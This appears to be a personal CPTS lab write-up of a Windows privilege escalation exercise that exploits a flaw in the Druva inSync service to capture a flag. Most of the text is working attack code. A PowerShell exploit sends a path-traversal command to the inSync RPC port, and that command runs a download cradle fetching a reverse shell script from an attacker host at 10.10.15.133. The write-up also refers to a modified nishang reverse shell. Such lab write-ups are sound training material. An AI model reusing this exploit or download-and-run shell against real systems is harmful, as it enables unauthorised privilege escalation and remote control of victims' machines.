# [Vulnerable Services](CPTS/Windows%20Privilege%20Escalation/Attacking%20%20the%20OS/Vulnerable%20Services.md)
### Work through the steps above to escalate privileges on the target system using the Druva inSync flaw. Submit the contents of the flag in the VulServices folder on the Administrator Desktop.

```powershell
netstat -ano | findstr 6064
```
![](Screenshot%202026-08-23%20at%2014.46.22.png)

```powershell
get-process -Id 3508
```
![](Screenshot%202026-08-23%20at%2014.46.42.png)

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```
![](Screenshot%202026-08-23%20at%2014.47.07.png)

Modified and transferred [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to Windows
![](Screenshot%202026-08-23%20at%2014.38.36.png)

Crate exploit.ps1 
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.133:8080/shell.ps1')"

$ErrorActionPreference = "Stop"
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Execute command `IEX (Get-Content .\exploit.ps1 -Raw)` ( remember to open http.server)
![](Screenshot%202026-08-23%20at%2014.54.15.png)
